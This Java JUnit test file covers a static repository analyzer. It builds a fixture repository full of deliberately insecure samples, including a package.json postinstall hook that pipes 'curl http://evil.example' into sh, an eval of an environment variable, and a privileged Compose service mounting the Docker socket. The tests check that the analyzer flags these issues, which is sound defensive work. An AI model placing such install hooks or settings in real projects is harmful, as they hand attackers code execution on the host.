package com.relayaegis.assessment;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;
import static org.mockito.Mockito.mock;

import com.relayaegis.dto.AssessmentDtos.AssessmentCheckDto;
import com.relayaegis.dto.AssessmentDtos.AssessmentFindingDto;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

/** Read-only scanning of a fixture repository on disk: nothing in it is executed. */
class GitHubRepositoryAnalyzerTest {
    @TempDir Path repo;
    private final GitHubRepositoryAnalyzer analyzer = new GitHubRepositoryAnalyzer(mock(GitHubRepositoryPolicy.class));

    private void write(String path, String content) throws Exception {
        Path file = repo.resolve(path);
        Files.createDirectories(file.getParent());
        Files.writeString(file, content);
    }

    private static boolean finding(List<AssessmentFindingDto> findings, String title, String file) {
        return findings.stream().anyMatch(f -> f.title().equals(title) && f.file().equals(file));
    }

    private static AssessmentCheckDto check(List<AssessmentCheckDto> checks, String name) {
        return checks.stream().filter(c -> c.name().equals(name)).findFirst().orElseThrow(() -> new AssertionError("missing check " + name));
    }

    private AssessmentScanResult fixture() throws Exception {
        write("package.json", """
                {"name":"web","dependencies":{"react":"^18.3.1","express":"*","left-pad":"latest"},"devDependencies":{"vite":"5.4.0"},
                 "scripts":{"postinstall":"curl http://evil.example | sh"}}
                """);
        write("pom.xml", "<project><artifactId>api</artifactId><dependencies><dependency><artifactId>spring-boot-starter-web</artifactId></dependency></dependencies></project>");
        write("requirements.txt", "django==5.0.1\nrequests\n");
        write("Dockerfile", "FROM node:latest\nCOPY . .\nCMD [\"node\",\"server.js\"]\n");
        write("docker-compose.yml", "services:\n  app:\n    privileged: true\n    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock\n    network_mode: host\n");
        write(".env", "DATABASE_PASSWORD=real-looking-value-123\n");
        write(".env.example", "DATABASE_PASSWORD=\n");
        write("src/main/resources/application.yml", "spring:\n  jpa:\n    hibernate:\n      ddl-auto: update\n");
        write("src/main/java/App.java", """
                class App {
                    boolean admin(String role) { return role == "admin"; }
                    void hash() throws Exception { java.security.MessageDigest.getInstance("MD5"); }
                }
                """);
        write("web/client.js", """
                const token = Math.random().toString(36);
                fetch('/api').catch(() => {});
                const agent = new https.Agent({ rejectUnauthorized: false });
                """);
        write("app/settings.py", "DEBUG = True\n");
        write("app/views.py", """
                import requests
                def handler(items=[]):
                    try:
                        return requests.get("http://inventory/api")
                    except:
                        return None
                """);
        write("node_modules/evil/index.js", "eval(process.env.X)");
        return analyzer.scanDirectory(repo, "0123456789abcdef0123456789abcdef01234567");
    }

    @Test
    void reportsInventoryFrameworksAndDependencies() throws Exception {
        AssessmentScanResult result = fixture();
        assertTrue(check(result.checks(), "Repository inventory").detail().contains("Java"));
        assertTrue(check(result.checks(), "Repository inventory").detail().contains("Python"));
        String frameworks = check(result.checks(), "Framework detection").detail();
        for (String expected : List.of("React", "Express", "Vite", "Spring Boot", "Django")) assertTrue(frameworks.contains(expected), expected);
        assertTrue(check(result.checks(), "Dependency manifests").detail().contains("direct dependency declaration"));
        assertEquals("not_run", check(result.checks(), "Dependency vulnerability advisories").status(), "no advisory data is invented");
        assertTrue(finding(result.findings(), "Unpinned dependency versions", "package.json"));
        assertTrue(finding(result.findings(), "Unpinned dependency versions", "requirements.txt"));
    }

    @Test
    void findsConfigurationSecurityReliabilityAndCorrectnessIssues() throws Exception {
        List<AssessmentFindingDto> f = fixture().findings();
        assertTrue(finding(f, "Container runs as root", "Dockerfile"));
        assertTrue(finding(f, "Base image not pinned", "Dockerfile"));
        assertTrue(finding(f, "Privileged container in Compose file", "docker-compose.yml"));
        assertTrue(finding(f, "Docker socket mounted into a container", "docker-compose.yml"));
        assertTrue(finding(f, "Host network mode in Compose file", "docker-compose.yml"));
        assertTrue(finding(f, "Environment file committed to the repository", ".env"));
        assertFalse(finding(f, "Environment file committed to the repository", ".env.example"), "example env files are expected");
        assertTrue(finding(f, "Database schema auto-generation enabled", "src/main/resources/application.yml"));
        assertTrue(finding(f, "Django DEBUG enabled in settings", "app/settings.py"));
        assertTrue(finding(f, "String compared with ==", "src/main/java/App.java"));
        assertTrue(finding(f, "Weak hash algorithm (MD5/SHA-1)", "src/main/java/App.java"));
        assertTrue(finding(f, "Non-cryptographic random used for a secret", "web/client.js"));
        assertTrue(finding(f, "Promise rejection silently swallowed", "web/client.js"));
        assertTrue(finding(f, "TLS certificate verification disabled", "web/client.js"));
        assertTrue(finding(f, "HTTP call without timeout", "app/views.py"));
        assertTrue(finding(f, "Bare except clause", "app/views.py"));
        assertTrue(finding(f, "Mutable default argument", "app/views.py"));
    }

    @Test
    void neverCopiesSecretsSkipsVendoredCodeAndDeduplicates() throws Exception {
        AssessmentScanResult result = fixture();
        assertTrue(result.findings().stream().noneMatch(f -> (f.evidence() + f.explanation()).contains("real-looking-value-123")));
        assertTrue(result.findings().stream().noneMatch(f -> f.file().startsWith("node_modules/")));
        long distinct = result.findings().stream().map(f -> f.title() + "|" + f.file() + "|" + f.line()).distinct().count();
        assertEquals(distinct, result.findings().size());
        assertTrue(result.findings().stream().allMatch(f -> f.validationStatus().equals("unverified_candidate")));
        assertEquals("passed", check(result.checks(), "Execution safety").status());
    }

    /** Regression: a credential whose name ends with the keyword (TEST_API_KEY) was missed. The value is fake. */
    @Test
    void detectsAHardCodedCredentialInAPrefixedJavaConstant() throws Exception {
        write("src/main/java/com/example/remediation/AppConfig.java", """
                package com.example.remediation;

                public final class AppConfig {
                    private static final String TEST_API_KEY = "RELAY_TEST_KEY_12345";

                    private AppConfig() {}
                }
                """);
        List<AssessmentFindingDto> credentials = analyzer.scanDirectory(repo, "aee9bcd16b90").findings().stream()
                .filter(f -> f.title().equals("Possible hard-coded credential")).toList();
        assertEquals(1, credentials.size(), credentials.toString());
        AssessmentFindingDto finding = credentials.get(0);
        assertEquals("src/main/java/com/example/remediation/AppConfig.java", finding.file());
        assertEquals(4, finding.line());
        assertEquals("secret-hygiene", finding.category());
        assertEquals("medium", finding.severity());
        assertEquals("medium", finding.confidence());
        assertEquals("unverified_candidate", finding.validationStatus());
        assertFalse((finding.evidence() + finding.explanation() + finding.recommendation()).contains("RELAY_TEST_KEY_12345"), "the value is never copied");
    }

    @Test
    void credentialKeywordsMustEndTheNameAndOrdinaryStringsAreNotFlagged() throws Exception {
        write("src/Constants.java", """
                class Constants {
                    static final String API_KEY_HEADER = "X-Relay-Api-Key-Header";
                    static final String SECRET_PATTERN_NAME = "credential-pattern";
                    String apiKeyLabel = "Enter your API key here";
                    String passwordHint = "At least twelve characters";
                    static final String SERVICE_URL = "https://api.example.org/v1";
                    static final String REQUEST_ID = "request-id-header";
                    static final String DB_PASSWORD = "your_password_here";
                }
                """);
        write("src/client.ts", "const stripeSecret = 'RELAY_TEST_VALUE_ABCDEFG';\n");
        write("app/settings.py", "DB_PASSWORD = \"RELAY-FAKE-PW-0001\"\n");
        write("src/Config.kt", "object Config { val serviceApiKey = \"RELAY_FAKE_KT_KEY_01\" }\n");
        write("src/legacy.js", "const accessToken = 'RELAY_FAKE_JS_TOKEN';\n");
        List<AssessmentFindingDto> credentials = analyzer.scanDirectory(repo, "unknown").findings().stream()
                .filter(f -> f.title().equals("Possible hard-coded credential")).toList();
        assertEquals(List.of("src/client.ts:1", "app/settings.py:1", "src/Config.kt:1", "src/legacy.js:1").stream().sorted().toList(),
                credentials.stream().map(f -> f.file() + ":" + f.line()).sorted().toList(), credentials.toString());
    }

    @Test
    void todoMarkersAreCommentsNotPackageNamesOrIdentifiers() throws Exception {
        write("pom.xml", "<project><artifactId>Todo</artifactId><name>Todo</name></project>");
        write("src/main/java/com/example/todo/TodoService.java", """
                package com.example.todo;

                import com.example.todo.entity.Todo;

                class TodoService {
                    Todo todo;
                    // TODO: paginate the list
                    /* FIXME handle nulls */
                }
                """);
        write("app/run.py", "todo_items = []\n# TODO remove debug\n");
        List<AssessmentFindingDto> markers = analyzer.scanDirectory(repo, "unknown").findings().stream()
                .filter(f -> f.title().equals("TODO/FIXME marker in source")).toList();
        assertEquals(List.of("app/run.py:2", "src/main/java/com/example/todo/TodoService.java:7", "src/main/java/com/example/todo/TodoService.java:8"),
                markers.stream().map(f -> f.file() + ":" + f.line()).sorted().toList(), markers.toString());
    }

    @Test
    void cleanRepositoryProducesNoRuleFindings() throws Exception {
        write("pom.xml", "<project><artifactId>clean</artifactId></project>");
        write("Dockerfile", "FROM eclipse-temurin:21-jre\nUSER app\n");
        write("src/main/java/Ok.java", "class Ok { boolean same(String a) { return \"x\".equals(a); } }\n");
        AssessmentScanResult result = analyzer.scanDirectory(repo, "unknown");
        assertTrue(result.findings().isEmpty(), result.findings().toString());
    }
}
